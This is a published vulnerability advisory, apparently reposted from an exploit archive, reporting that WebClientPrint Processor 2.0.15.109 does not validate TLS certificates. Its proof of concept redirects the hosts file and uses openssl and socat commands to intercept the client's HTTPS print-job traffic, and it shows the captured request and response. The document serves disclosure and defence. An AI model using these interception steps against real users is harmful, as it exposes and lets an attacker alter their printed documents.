@@ -1,0 +1,193 @@
+id: 28360
+date: 08/23/2017
+title: WebClientPrint Processor 2.0.15.109 TLS Validation Vulnerability
+author: RedTeam
+cves: 
+
+Advisory: WebClientPrint Processor 2.0: No Validation of TLS Certificates
+
+RedTeam Pentesting discovered that WebClientPrint Processor (WCPP) does
+not validate TLS certificates when initiating HTTPS connections. Thus, a
+man-in-the-middle attacker may intercept and/or modify HTTPS traffic in
+transit. This may result in a disclosure of sensitive information and
+the integrity of printed documents cannot be guaranteed.
+
+
+Details
+=======
+
+Product: Neodynamic WebClientPrint Processor
+Affected Versions: 2.0.15.109 (Microsoft Windows)
+Fixed Versions: >= 2.0.15.910
+Vulnerability Type: Improper Certificate Validation
+Security Risk: medium
+Vendor URL: http://www.neodynamic.com/
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2015-011
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+Neodynamic's WebClientPrint Processor is a client-side application,
+which allows server-side applications to print documents on a client's
+printer without user interaction, bypassing the browser's print
+functionality. The server-side application may be written in ASP.NET or
+PHP while on the client-side multiple platforms and browsers are
+supported.
+
+"Send raw data, text and native commands to client printers without
+showing or displaying any print dialog box!" (Neodynamic's website)
+
+
+More Details
+============
+
+Upon installation under Microsoft Windows, WCPP registers itself as a
+handler for the "webclientprint" URL scheme. Thus, any URL starting with
+"webclientprint:" is handled by WCPP. For example, entering
+
+webclientprint:-about
+
+in the URL bar of a browser opens the about box of WCPP.
+
+Neodynamic prodvides an online demo for test printing at the following
+URL:
+
+http://webclientprint.azurewebsites.net/
+
+If visited via HTTPS, the WCPP component on the client-side will try to
+fetch the print job via HTTPS as well.
+
+
+Proof of Concept
+================
+
+To simulate a man-in-the-middle scenario, an entry similar to the
+following was appended to the "hosts" file:
+
+------------------------------------------------------------------------
+10.0.2.2 webclientprint.azurewebsites.net
+------------------------------------------------------------------------
+
+On the host 10.0.2.2, a self-signed certificate can be generated and
+afterwards socat[1] can be used to intercept and display the encrypted
+HTTP traffic as follows:
+
+------------------------------------------------------------------------
+$ openssl genrsa -out server.key 4096
+$ openssl dhparam -out dhparam.pem 1024
+$ openssl req -new -x509 -key server.key -out server.pem -days 365 \
+-subj /CN=webclientprint.azurewebsites.net
+$ cat server.key >> server.pem
+$ cat dhparam.pem >> server.pem
+$ sudo socat -v openssl-listen:443,reuseaddr,verify=0,fork,\
+cert=server.pem openssl-connect:webclientprint.azurewebsites.net:443,\
+verify=0
+------------------------------------------------------------------------
+
+The demo website is available via HTTPS using the following URL:
+
+https://webclientprint.azurewebsites.net/
+
+Any modern browser displays a warning due to the invalid TLS certificate
+presented by socat.
+
+On the contrary, WCPP simply accepts any certificate it is presented
+with, when, for examplem printing a demo TXT file. Such a request is
+given in the listing below. The output has been shortened and wrapped
+manually for better readability.
+
+------------------------------------------------------------------------
+GET /DemoPrintFile.ashx?clientPrint&useDefaultPrinter=undefined&
+    printerName=null&filetype=TXT HTTP/1.0\r
+Host: webclientprint.azurewebsites.net\r
+User-Agent: WCPP/2.0.15.109(Windows; 6.1)\r
+Accept-Encoding: gzip, deflate\r
+\r
+< 2015/09/07 10:29:27.478913  length=3538 from=0 to=3537
+HTTP/1.1 200 OK\r
+Cache-Control: private\r
+Content-Length: 3180\r
+Content-Type: application/octet-stream\r
+Server: Microsoft-IIS/8.0\r
+X-AspNet-Version: 4.0.30319\r
+X-Powered-By: ASP.NET\r
+Set-Cookie: ARRAffinity=23c01e1a9de38f884445e396de9940aef5941b9af3f6d9
+    cfa57066fe4d5fcb16;Path=/;Domain=webclientprint.azurewebsites.net\r
+Date: Mon, 07 Sep 2015 08:29:27 GMT\r
+Connection: close\r
+\r
+cpj..\v...\v..wcpPF:9c8d5316ffeb403d8be09565c2391f92.TXT|Printed By
+WebClientPrint\r
+=========================\r
+\r
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce urna
+massa, eleifend non posuere quis, iaculis et libero. Curabitur lacinia
+dolor non nisl pharetra tempus.
+[...]
+Etiam nisl nisi, eleifend vel molestie tincidunt, porttitor ac nunc.
+Vestibulum vulputate magna gravida neque imperdiet ac viverra nulla
+suscipit..Acopian Technical Company - 1 WebApp Lic - 2 WebServer
+Lic|xxxxxxxxxxxxxxxxxxxxx
+------------------------------------------------------------------------
+
+This shows that WCPP does not verify TLS certificates when establishing
+HTTPS connections.
+
+
+Workaround
+==========
+
+Affected users should disable the WCPP handler and upgrade to a fixed
+version as soon as possible.
+
+
+Fix
+===
+
+Install a WCPP version greater or equal to 2.0.15.910[0].
+
+
+Security Risk
+=============
+
+WCPP does not verify TLS certificates when establishing HTTPS
+connections. Man-in-the-middle attackers can therefore intercept those
+connections with little effort. This may lead to a disclosure of
+confidential information if sensitive documents are printed via WCPP.
+Furthermore, the integrity of the printed documents cannot be guaranteed
+as attackers are able to modify the documents in transit.
+
+The described attack requires a man-in-the-middle position which is a
+rather strong prerequisite. It is therefore estimated that the
+vulnerability poses a medium risk.
+
+
+Timeline
+========
+
+2015-08-24 Vulnerability identified
+2015-09-03 Customer approved disclosure to vendor
+2015-09-04 Asked vendor for security contact
+2015-09-04 CVE number requested
+2015-09-04 Vendor responded with security contact
+2015-09-07 Vendor notified
+2015-09-07 Vendor acknowledged receipt of advisory
+2015-09-15 Vendor released fixed version
+2015-09-16 Customer asked to wait with advisory release until all their
+           clients are updated
+2017-07-31 Customer approved advisory release
+2017-08-22 Advisory released
+
+
+References
+==========
+
+[0] https://neodynamic.wordpress.com/2015/09/15/webclientprint-2-0-for-windows-clients-critical-update/
+[1] http://www.dest-unreach.org/socat/
+
+#  0day.today [2023-03-25]  #
